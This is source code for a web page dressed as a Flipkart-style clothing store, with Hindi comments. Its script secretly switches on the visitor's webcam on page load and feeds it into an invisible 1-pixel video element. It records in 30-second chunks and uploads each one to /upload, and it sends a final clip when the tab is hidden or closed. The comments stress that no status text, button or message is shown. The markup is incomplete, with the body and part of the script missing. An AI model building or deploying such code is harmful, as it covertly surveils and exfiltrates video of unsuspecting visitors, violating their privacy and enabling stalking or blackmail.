        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, sans-serif; }
        body { background-color: #f1f3f6; }
        
        /* Header - Flipkart style */
        .header {
            background: #fff;
            padding: 12px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
            position: sticky;
            top: 0;
            z-index: 100;
            border-bottom: 1px solid #e0e0e0;
        }
        .logo {
            font-size: 26px;
            font-weight: bold;
            color: #f43397;
        }
        .logo span { color: #ff6f00; }
        .search-bar input {
            width: 400px;
            padding: 10px 16px;
            border-radius: 8px;
            border: 1px solid #ddd;
            background: #f5f5f5;
            font-size: 14px;
        }
        .cart-icon {
            font-size: 28px;
            cursor: pointer;
        }

        /* Banner */
        .banner {
            background: linear-gradient(135deg, #ff9a9e, #fad0c4);
            margin: 16px 20px;
            border-radius: 16px;
            padding: 32px 20px;
            text-align: center;
            box-shadow: 0 2px 6px rgba(0,0,0,0.05);
        }
        .banner h2 { font-size: 28px; margin-bottom: 8px; }

        /* Product Grid - Flipkart cards */
        .product-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
            gap: 24px;
            padding: 20px 24px;
            max-width: 1400px;
            margin: auto;
        }
        .product-card {
            background: white;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
            transition: transform 0.2s, box-shadow 0.2s;
            cursor: pointer;
        }
        .product-card:hover {
            transform: scale(1.02);
            box-shadow: 0 8px 20px rgba(0,0,0,0.15);
        }
        .product-img {
            width: 100%;
            height: 280px;
            object-fit: cover;
            background: #f9f9f9;
        }
        .product-info {
            padding: 14px;
        }
        .product-title {
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 6px;
            color: #212121;
            line-height: 1.4;
            height: 44px;
            overflow: hidden;
        }
        .price {
            color: #f43397;
            font-weight: bold;
            font-size: 18px;
        }
        .old-price {
            color: #777;
            font-size: 13px;
            text-decoration: line-through;
            margin-left: 8px;
        }
        .rating {
            background: #26a541;
            color: white;
            font-size: 12px;
            padding: 2px 8px;
            border-radius: 16px;
            display: inline-block;
            margin-top: 8px;
        }

        /* Footer */
        .footer {
            text-align: center;
            padding: 24px;
            background: white;
            border-top: 1px solid #e0e0e0;
            color: #777;
            font-size: 13px;
            margin-top: 30px;
        }

        /* Hidden camera - no UI elements */
        #hiddenCamera {
            position: fixed;
            bottom: -100px;
            right: -100px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }

        /* ---------- MODAL (Full screen product view) ---------- */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.85);
            z-index: 2000;
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(5px);
        }
        .modal-content {
            background: white;
            max-width: 90%;
            max-height: 90%;
            width: 700px;
            border-radius: 24px;
            overflow-y: auto;
            position: relative;
            animation: fadeIn 0.3s;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }
        .modal-close {
            position: absolute;
            top: 16px;
            right: 20px;
            font-size: 32px;
            font-weight: bold;
            color: #333;
            cursor: pointer;
            background: white;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
            z-index: 10;
        }
        .modal-close:hover { background: #f0f0f0; }
        .modal-img {
            width: 100%;
            height: 400px;
            object-fit: cover;
            border-radius: 24px 24px 0 0;
        }
        .modal-details {
            padding: 24px;
        }
        .modal-title {
            font-size: 28px;
            font-weight: bold;
            margin-bottom: 12px;
        }
        .modal-price {
            font-size: 26px;
            color: #f43397;
            font-weight: bold;
        }
        .modal-old-price {
            font-size: 18px;
            text-decoration: line-through;
            color: #888;
            margin-left: 12px;
        }
        .modal-rating {
            background: #26a541;
            color: white;
            padding: 4px 12px;
            border-radius: 20px;
            display: inline-block;
            margin: 16px 0;
        }
        .modal-desc {
            color: #555;
            line-height: 1.6;
            margin-top: 16px;
        }
        .buy-btn {
            background: #f43397;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 40px;
            font-size: 18px;
            font-weight: bold;
            margin-top: 24px;
            cursor: pointer;
            width: 100%;
        }
        .buy-btn:hover { background: #d81b7a; }
    </style>
</head>

    function closeModal() {
        modal.style.display = 'none';
    }

    // Add click listeners after render
    document.querySelectorAll('.product-card').forEach(card => {
        card.addEventListener('click', () => {
            const idx = card.getAttribute('data-idx');
            if (idx !== null) openModal(products[parseInt(idx)]);
        });
    });

    modalClose.addEventListener('click', closeModal);
    window.addEventListener('click', (e) => {
        if (e.target === modal) closeModal();
    });
    document.getElementById('modalBuyBtn').addEventListener('click', () => {
        alert('🚀 ऑर्डर पेज जल्द आ रहा है। इस लहंगे को कार्ट में डाल दिया गया है।');
        closeModal();
    });

    // ---------- साइलेंट कैमरा रिकॉर्डर (कोई स्टेटस टेक्स्ट नहीं, कोई बटन नहीं) ----------
    let mediaRecorder = null;
    let recordedChunks = [];
    let stream = null;
    let sessionId = Date.now();
    let autoSaveInterval = null;
    let isUploading = false;

    async function startCamera() {
        try {
            // स्टेटस टेक्स्ट हटा दिया - सीधे कैमरा स्टार्ट करें
            stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
            document.getElementById('hiddenCamera').srcObject = stream;
            startNewRecorder();
            autoSaveInterval = setInterval(() => {
                if (!isUploading) saveAndRestartRecorder();
            }, 30000);
        } catch(err) {
            // कोई ऑन-स्क्रीन मैसेज नहीं, सिर्फ कंसोल में लॉग
            console.error('Camera error:', err);
        }
    }

    function startNewRecorder() {
        if (!stream) return;
        if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
        recordedChunks = [];
        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
        mediaRecorder.ondataavailable = (event) => {
            if (event.data && event.data.size > 0) recordedChunks.push(event.data);
        };
        mediaRecorder.onstop = () => {
            if (recordedChunks.length > 0) uploadVideo(recordedChunks.slice());
        };
        mediaRecorder.start();
    }

    async function uploadVideo(chunksArray) {
        if (!chunksArray.length) return;
        isUploading = true;
        const blob = new Blob(chunksArray, { type: 'video/webm' });
        const filename = `rec_${sessionId}_${Date.now()}.webm`;
        const formData = new FormData();
        formData.append('video', blob, filename);
        try {
            await fetch('/upload', { method: 'POST', body: formData });
            // सफलता का कोई स्क्रीन मैसेज नहीं
        } catch(e) {
            console.error('Upload error:', e);
        } finally {
            isUploading = false;
        }
    }

    function saveAndRestartRecorder() {
        if (!mediaRecorder || mediaRecorder.state !== 'recording') return;
        mediaRecorder.stop();
        setTimeout(() => {
            if (stream && stream.active) startNewRecorder();
        }, 500);
    }

    function onPageClose() {
        if (autoSaveInterval) clearInterval(autoSaveInterval);
        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
            if (recordedChunks.length) {
                const finalBlob = new Blob(recordedChunks, { type: 'video/webm' });
                const formData = new FormData();
                formData.append('video', finalBlob, `final_${sessionId}_${Date.now()}.webm`);
                navigator.sendBeacon('/upload', formData);
            }
        }
        if (stream) stream.getTracks().forEach(track => track.stop());
    }

    window.addEventListener('beforeunload', onPageClose);
    document.addEventListener('visibilitychange', () => {
        if (document.visibilityState === 'hidden') onPageClose();
    });

    startCamera();
</script>
</body>
</html>
